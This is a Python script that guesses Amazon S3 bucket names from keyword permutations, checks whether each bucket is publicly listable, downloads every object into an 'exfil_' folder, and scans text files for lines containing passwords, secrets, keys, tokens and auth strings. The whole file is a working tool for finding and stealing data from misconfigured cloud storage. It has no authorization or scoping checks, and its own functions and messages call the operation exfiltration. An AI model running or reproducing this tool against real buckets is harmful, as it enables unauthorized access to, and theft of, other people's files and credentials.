import os
import time
import requests
import itertools
import xml.etree.ElementTree as xmlET

def promptForMode() -> str:
    print("[MODE] Select input method:")
    print("1. Enter exact bucket name")
    print("2. Enter keyword list (auto-combo mode)")
    return input("Enter choice (1 or 2): ").strip()

def promptForBucketName() -> str:
    return input("Enter target S3 bucket name (without s3://): ").strip()

def promptForKeywords() -> list[str]:
    return input("Enter keywords (max 4, space-separated, e.g. dev secret test): ").strip().lower().split()

def generateBucketCombos(arrKeywords: list[str]) -> list[str]:
    arrCombinations = []
    for n in range(2, min(len(arrKeywords) + 1, 5)):
        for arrCombo in itertools.permutations(arrKeywords, n):
            strDash = '-'.join(arrCombo)
            strUnderscore = '_'.join(arrCombo)
            strPlain = ''.join(arrCombo)
            arrCombinations.extend([strDash, strUnderscore, strPlain])
    return list(set(arrCombinations))

def checkIfBucketIsPublic(strBucketName: str) -> tuple[bool, str]:
    strURL = f"http://{strBucketName}.s3.amazonaws.com/"
    print(f"[INFO] Checking bucket: {strBucketName}")
    try:
        objResponse = requests.get(strURL, timeout=(2, 5))
        return objResponse.status_code == 200, objResponse.text
    except Exception as e:
        print(f"[ERROR] {strBucketName} error: {e}")
        return False, ""

def parseS3FileKeys(xmlResponse: str) -> list[str]:
    arrKeys = []
    try:
        objRoot = xmlET.fromstring(xmlResponse)
        for objElement in objRoot.iter('{http://s3.amazonaws.com/doc/2006-03-01/}Key'):
            if objElement.text:
                arrKeys.append(objElement.text)
    except xmlET.ParseError:
        pass
    return arrKeys

def scanTextFileForSecrets(strFilePath: str, strOutputDir: str, arrCustomKeywords: list[str] = None) -> None:
    arrKeywords = arrCustomKeywords if arrCustomKeywords else ["password", "passwd", "secret", "key", "api", "token", "db", "auth"]
    strOutFile = os.path.join(strOutputDir, "relevant_lines.txt")
    arrMatchedLines = []
    try:
        with open(strFilePath, 'r', encoding='utf-8', errors='ignore') as fInput:
            for strLine in fInput:
                for strKeyword in arrKeywords:
                    if strKeyword.lower() in strLine.lower():
                        print(f"[FOUND] {strLine.strip()}")
                        arrMatchedLines.append(strLine)
                        break
        if arrMatchedLines:
            with open(strOutFile, 'a', encoding='utf-8') as fOut:
                fOut.writelines(arrMatchedLines)
    except Exception as e:
        print(f"[ERROR] Failed scanning '{strFilePath}': {e}")

def downloadS3Object(strBucketName: str, strKey: str, strOutputDir: str, arrScanKeywords: list[str] = None) -> None:
    strFileURL = f"https://{strBucketName}.s3.amazonaws.com/{strKey}"
    strSafeName = strKey.replace('/', '_')
    strOutPath = os.path.join(strOutputDir, strSafeName)
    objResponse = requests.get(strFileURL)
    if objResponse.status_code == 200:
        with open(strOutPath, 'wb') as fOut:
            fOut.write(objResponse.content)
        print(f"[INFO] Downloaded: {strKey} -> {strOutPath}")
        if strOutPath.lower().endswith(".txt"):
            scanTextFileForSecrets(strOutPath, strOutputDir, arrScanKeywords)
    else:
        print(f"[ERROR] Failed download {strKey} (HTTP {objResponse.status_code})")

def attemptExfilFromBucket(strBucketName: str, arrScanKeywords: list[str] = None) -> None:
    bIsPublic, strListing = checkIfBucketIsPublic(strBucketName)
    if not bIsPublic:
        print(f"[ERROR] '{strBucketName}' not listable or not exist.")
        return
    print(f"[FOUND] '{strBucketName}' is PUBLIC - proceeding with enumeration.")
    arrKeys = parseS3FileKeys(strListing)
    if not arrKeys:
        print("[INFO] No objects found or listing disabled.")
        return
    strOutputDir = f"exfil_{strBucketName}"
    os.makedirs(strOutputDir, exist_ok=True)
    for strKey in arrKeys:
        print(f"[FOUND] Object: {strKey}")
        downloadS3Object(strBucketName, strKey, strOutputDir, arrScanKeywords)
    print(f"[INFO] Exfiltration complete. Files in: {strOutputDir}")

def main() -> None:
    strMode = promptForMode()
    strInput = input("Enter scan keywords (space-separated), or press ENTER for defaults: ").strip()
    arrScanKeywords = strInput.lower().split() if strInput else None

    if strMode == "1":
        attemptExfilFromBucket(promptForBucketName(), arrScanKeywords)
    elif strMode == "2":
        arrKeywords = promptForKeywords()
        intDelaySec = int(input("Enter delay between attempts (seconds): ").strip())
        for strBucket in generateBucketCombos(arrKeywords):
            attemptExfilFromBucket(strBucket, arrScanKeywords)
            time.sleep(intDelaySec)
    else:
        print("[ERROR] Invalid mode choice.")

if __name__ == "__main__":
    main()
